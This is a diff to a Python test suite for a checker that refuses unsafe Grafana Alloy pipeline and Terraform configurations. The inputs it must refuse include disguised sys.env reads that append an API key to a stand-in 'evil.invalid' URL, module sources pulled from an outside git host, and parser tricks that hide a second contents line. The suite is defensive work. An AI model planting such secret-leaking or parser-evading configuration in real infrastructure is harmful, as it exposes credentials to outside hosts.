@@ -71,8 +71,8 @@ BREAKS = [
     ("scrape http_headers", _replace("\ttargets    = discovery.relabel.shared_kafka.output\n",
                                      '\ttargets      = discovery.relabel.shared_kafka.output\n'
                                      '\thttp_headers = {"X-Key" = ["abc"]}\n'), "credential"),
-    ("a sigv4 secret key", _replace(AUTH, AUTH + '\n\t\tsigv4 {\n\t\t\taccess_key = "AKIA0000"\n\t\t\tsecret_key = "s3cr3t"\n\t\t}\n'),
-     "credential"),
+    ("a sigv4 access key", _replace(AUTH, AUTH + '\n\t\tsigv4 {\n\t\t\taccess_key = "AKIA0000"\n\t\t}\n'), "credential"),
+    ("a sigv4 secret key", _replace(AUTH, AUTH + '\n\t\tsigv4 {\n\t\t\tsecret_key = "s3cr3t"\n\t\t}\n'), "credential"),
     ("a templatefile call", _replace('names = ["andara-shared"]', 'names = [templatefile("x", {})]'), "templatefile"),
     ("a remote_write to Grafana Cloud", _replace(pipelines_check.RECEIVER, OTHER_URL), "remote_write"),
     ("a second remote_write endpoint", _replace(AUTH, AUTH + '\t}\n\n\tendpoint {\n\t\turl = "%s"\n' % OTHER_URL),
@@ -106,17 +106,18 @@ BREAKS = [
     ("a top-level attribute", _append('x = 1'), "component"),
     ("sys.env of a name env-allow.txt doesn't list", _auth(['username = "1"', 'password = sys.env("GRAFANA_TELEMETRY_TOKEN")']),
      "sys.env"),
-    ("sys.env of a computed name", _auth(['username = "1"', 'password = sys.env("PG_" + "PASSWORD")']), "sys.env"),
+    ("sys.env of a computed name", _auth(['username = "1"', 'password = sys.env("PG_" + "PASSWORD")']), "sys.env",
+     "PG_PASSWORD\nPG_\nPASSWORD\n"),
     ("a password file, even from a listed variable",
      _auth(['username      = "1"', 'password_file = sys.env("PG_MONITOR_PASSWORD")']), "credential", "PG_MONITOR_PASSWORD\n"),
     ("sys.env through a list", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + [sys.env][0]("GCLOUD_FM_API_KEY")'),
-     "sys.env"),
+     "sys.env", "GCLOUD_FM_API_KEY\n"),
     ("sys.env in parentheses", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + (sys.env)("GCLOUD_FM_API_KEY")'),
-     "sys.env"),
+     "sys.env", "GCLOUD_FM_API_KEY\n"),
     ("sys indexed", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + sys["env"]("GCLOUD_FM_API_KEY")'),
-     "sys.env"),
+     "sys.env", "GCLOUD_FM_API_KEY\n"),
     ("the deprecated env()", _replace('role = "pod"', 'role       = "pod"\n\tapi_server = "https://evil.invalid/" + env("GCLOUD_FM_API_KEY")'),
-     "sys.env"),
+     "sys.env", "GCLOUD_FM_API_KEY\n"),
     ("a reference alloy validate refuses", _replace("forward_to = [prometheus.relabel.shared_kafka.receiver]",
                                                     "forward_to = [prometheus.relabel.nope.receiver]"),
      "alloy validate"),
@@ -156,6 +157,17 @@ class Check(unittest.TestCase):
                 rc, out = self.run_on(change(self.source), *allow)
                 self.assertEqual(rc, 1, out)
                 self.assertRegex(out, r"refused: .*shared-kafka\.alloy:\d+: %s: " % re.escape(rule))
+
+    def test_each_sys_env_form_is_refused_as_a_form(self):
+        """A form break lists its variable in env-allow.txt, so only the form rule can refuse it."""
+        forms = [b for b in BREAKS if b[2] == "sys.env" and len(b) == 4]
+        self.assertEqual(len(forms), 5)
+        for name, change, rule, allow in forms:
+            with self.subTest(name):
+                rc, out = self.run_on(change(self.source), allow)
+                self.assertEqual(rc, 1, out)
+                self.assertIn("the name one string literal", out)
+                self.assertNotIn("is not in env-allow.txt", out)
 
     def test_a_url_that_is_not_one_literal_says_so(self):
         """The (not one string literal) branch: a raw string holding exactly the receiver is refused too."""
@@ -197,6 +209,9 @@ class Check(unittest.TestCase):
 PIPELINES_TF = os.path.join(pipelines_check.GRAFANA, "stacks", "solo7dev", "pipelines.tf")
 RESOURCE_LINE = 'contents                   = file("${path.module}/../../pipelines/shared-kafka.alloy")'
 INLINE = '"prometheus.scrape \\"x\\" {}"'
+HERE = "stacks/solo7dev/pipelines.tf"
+TYPE = pipelines_check.PIPELINE_TYPE
+INLINE_RESOURCE = 'resource "%s" "x" {\n  name     = "x"\n  contents = %s\n}\n' % (TYPE, INLINE)
 
 
 @unittest.skipUnless(HAVE_ALLOY or os.environ.get("CI"), "bin/alloy absent; make bootstrap installs it")
@@ -222,49 +237,93 @@ class Resources(unittest.TestCase):
             rc = pipelines_check.main(["--tf-dir", self.tf_dir])
         return rc, out.getvalue()
 
-    def test_the_committed_resource_passes(self):
-        self.assertEqual(self.run_on({"stacks/solo7dev/pipelines.tf": self.tf})[0], 0)
-
-    def test_a_comment_naming_contents_passes(self):
-        tf = self.tf.replace("  matchers ", "  # contents = file(...) is the only form; } {\n  matchers ")
-        rc, out = self.run_on({"stacks/solo7dev/pipelines.tf": tf})
-        self.assertEqual(rc, 0, out)
+    def fresh(self, files):
+        shutil.rmtree(self.tf_dir)
+        os.mkdir(self.tf_dir)
+        return self.run_on(files)
 
     def test_the_committed_tree_passes(self):
         out = io.StringIO()
         with contextlib.redirect_stdout(out):
             self.assertEqual(pipelines_check.main([]), 0)
 
-    def test_each_break_is_refused(self):
-        here = "stacks/solo7dev/pipelines.tf"
-        resource = 'resource "grafana_fleet_management_pipeline" "x" {\n  name     = "x"\n  contents = %s\n}\n' % INLINE
-        breaks = [
-            ("an inline heredoc", {here: self.tf.replace(RESOURCE_LINE, 'contents = <<-EOT\n    loki.write "c" {}\n  EOT')}),
-            ("a source outside pipelines/", {here: self.tf.replace("../../pipelines/shared-kafka.alloy", "evil.alloy")}),
-            ("a source that does not exist", {here: self.tf.replace("pipelines/shared-kafka.alloy", "pipelines/nope.alloy")}),
-            ("a name that is not its source's", {here: self.tf.replace('"shared-kafka"', '"other"', 1)}),
-            ("a for_each", {here: self.tf.replace("  enabled ", '  for_each = toset(["a"])\n  enabled ')}),
-            ("a second resource with inline contents", {here: self.tf + "\n" + resource}),
-            ("the real contents in a comment, a column-0 line, then inline contents",
-             {here: self.tf.replace(RESOURCE_LINE, "/*\n  " + RESOURCE_LINE + "\nx\n*/\n  contents = " + INLINE)}),
-            ("a heredoc whose closer is at column 0, then inline contents",
-             {here: self.tf.replace("  matchers ", "  labels   = [<<-eot\n" + RESOURCE_LINE + "\neot\n  ]\n  matchers ")
-                                .replace(RESOURCE_LINE, "contents = " + INLINE, 1)}),
-            ("a good contents line and a } in a block comment, then inline contents",
-             {here: self.tf.replace(RESOURCE_LINE, "/*\n  " + RESOURCE_LINE + "\n}\n*/\n  contents = " + INLINE)}),
-            ("a good contents line and a } in a heredoc, then inline contents",
-             {here: self.tf.replace(RESOURCE_LINE, "labels = <<-EOT\n    " + RESOURCE_LINE + "\n    }\n  EOT\n  contents = " + INLINE)}),
-            ("a resource in a module", {here: self.tf, "modules/stack/fleet.tf": resource}),
-            ("a resource in another file of the root", {here: self.tf, "stacks/solo7dev/main.tf": resource}),
-            ("a .tf.json", {here: self.tf, "stacks/solo7dev/override.tf.json": "{}"}),
+    def test_each_accept_passes(self):
+        """The committed resource, and text a hand scanner misreads, read as Terraform reads it."""
+        accepts = [
+            ("the committed resource", self.tf),
+            ("a comment naming contents, and an unbalanced }",
+             self.tf.replace("  matchers ", "  # contents = file(...) is the only form; } {\n  matchers ")),
+            ("a # comment holding a }", self.tf.replace("  enabled ", "  # }\n  enabled ")),
+            ("a string holding \\\" and }", self.tf.replace("  enabled ", '  description = "a \\" }"\n  enabled ')),
+            ("an interpolation holding a \"}\"", self.tf.replace("  enabled ", '  description = "${"}"}"\n  enabled ')),
+            ("a $${ escape", self.tf.replace("  enabled ", '  description = "$${x} %%{y}"\n  enabled ')),
+            ("a module with a relative source", self.tf + '\nmodule "m" {\n  source = "../../modules/stack"\n}\n'),
         ]
-        for name, files in breaks:
+        for name, tf in accepts:
             with self.subTest(name):
-                shutil.rmtree(self.tf_dir)
-                os.mkdir(self.tf_dir)
-                rc, out = self.run_on(files)
+                rc, out = self.fresh({HERE: tf})
+                self.assertEqual(rc, 0, out)
+
+    def test_each_break_is_refused(self):
+        """(name, files, what the refusal says). Each break fails one rule, and only that rule's refusal counts."""
+        good = self.tf
+        exact = "contents must be exactly"
+        declared = "is declared only in stacks/<root>/pipelines.tf"
+        elsewhere = "and is named nowhere else"
+        one = "no for_each, count or dynamic"
+        module = "its source must be a relative path inside"
+        breaks = [
+            ("an inline heredoc", {HERE: good.replace(RESOURCE_LINE, 'contents = <<-EOT\n    loki.write "c" {}\n  EOT')}, exact),
+            ("a source outside pipelines/", {HERE: good.replace("../../pipelines/shared-kafka.alloy", "evil.alloy")}, exact),
+            ("a source written with %{", {HERE: good.replace("${path.module}", "%{if true}x%{endif}")}, exact),
+            ("a source that does not exist",
+             {HERE: good.replace("pipelines/shared-kafka.alloy", "pipelines/nope.alloy").replace('"shared-kafka"', '"nope"')},
+             "pipelines/nope.alloy does not exist"),
+            ("a name that is not its source's", {HERE: good.replace('"shared-kafka"', '"other"', 1)}, "name must be"),
+            ("a for_each", {HERE: good.replace("  enabled ", '  for_each = toset(["a"])\n  enabled ')}, one),
+            ("a count", {HERE: good.replace("  enabled ", "  count = 2\n  enabled ")}, one),
+            ("a dynamic block", {HERE: good.replace("  enabled ", '  dynamic "x" {\n    for_each = []\n    content {}\n  }\n  enabled ')},
+             one),
+            ("a second resource with inline contents", {HERE: good + "\n" + INLINE_RESOURCE}, exact),
+            ("two contents lines", {HERE: good.replace(RESOURCE_LINE, RESOURCE_LINE + "\n  " + RESOURCE_LINE)}, exact),
+            ("the real contents in a comment, a column-0 line, then inline contents",
+             {HERE: good.replace(RESOURCE_LINE, "/*\n  " + RESOURCE_LINE + "\nx\n*/\n  contents = " + INLINE)}, exact),
+            ("a heredoc whose closer is at column 0, then inline contents",
+             {HERE: good.replace("  matchers ", "  labels   = [<<-eot\n" + RESOURCE_LINE + "\neot\n  ]\n  matchers ")
+                         .replace(RESOURCE_LINE, "contents = " + INLINE, 1)}, exact),
+            ("a good contents line and a } in a block comment, then inline contents",
+             {HERE: good.replace(RESOURCE_LINE, "/*\n  " + RESOURCE_LINE + "\n}\n*/\n  contents = " + INLINE)}, exact),
+            ("a good contents line and a } in a heredoc, then inline contents",
+             {HERE: good.replace(RESOURCE_LINE, "labels = <<-EOT\n    " + RESOURCE_LINE + "\n    }\n  EOT\n  contents = " + INLINE)},
+             exact),
+            # A hand scanner read "$${" as an interpolation and the code after it as string.
+            ("a $${ escape hiding a second contents",
+             {HERE: good.replace(RESOURCE_LINE, RESOURCE_LINE + '\n  description = "$${"\n  contents = var.stack\n  x = "}"')},
+             exact),
+            ("a %%{ escape hiding a second contents",
+             {HERE: good.replace(RESOURCE_LINE, RESOURCE_LINE + '\n  description = "%%{"\n  contents = var.stack\n  x = "}"')},
+             exact),
+            # A heredoc closer inside a ${ } that spans lines does not close the heredoc.
+            ("a heredoc closer inside an interpolation, then inline contents",
+             {HERE: good.replace(RESOURCE_LINE, "description = <<-EOT\n    ${<<-INNER\n    EOT\n    " + RESOURCE_LINE
+                                 + "\n    INNER\n    }\n  EOT\n  contents = " + INLINE)}, exact),
+            ("the good resource in a module", {HERE: good, "modules/stack/fleet.tf": good}, declared),
+            ("the good resource in another file of the root", {HERE: good, "stacks/solo7dev/main.tf": good}, declared),
+            ("the type named in a string", {HERE: good.replace("  enabled ", '  description = "%s"\n  enabled ' % TYPE)},
+             elsewhere),
+            ("a data source of the type", {HERE: good + '\ndata "%s" "x" {}\n' % TYPE}, elsewhere),
+            ("a resource nested in a block", {HERE: good + '\nlocals {\n  resource "%s" "x" {}\n}\n' % TYPE}, elsewhere),
+            ("a module from the registry", {HERE: good + '\nmodule "m" {\n  source = "evil/pipelines/grafana"\n}\n'}, module),
+            ("a module from git", {HERE: good + '\nmodule "m" {\n  source = "git::https://evil.invalid/m.git"\n}\n'}, module),
+            ("a module outside the tree", {HERE: good + '\nmodule "m" {\n  source = "../../../../evil"\n}\n'}, module),
+            ("an unparseable file", {HERE: good, "stacks/solo7dev/main.tf": 'locals {\n  a = "\n}\n'}, "not parseable"),
+            ("a .tf.json", {HERE: good, "stacks/solo7dev/override.tf.json": "{}"}, ".tf.json"),
+        ]
+        for name, files, detail in breaks:
+            with self.subTest(name):
+                rc, out = self.fresh(files)
                 self.assertEqual(rc, 1, out)
-                self.assertRegex(out, r"refused: .*\.tf(\.json)?:\d+: terraform: ")
+                self.assertRegex(out, r"refused: .*\.tf(\.json)?:\d+: terraform: .*%s" % re.escape(detail))
 
 
 class Usage(unittest.TestCase):
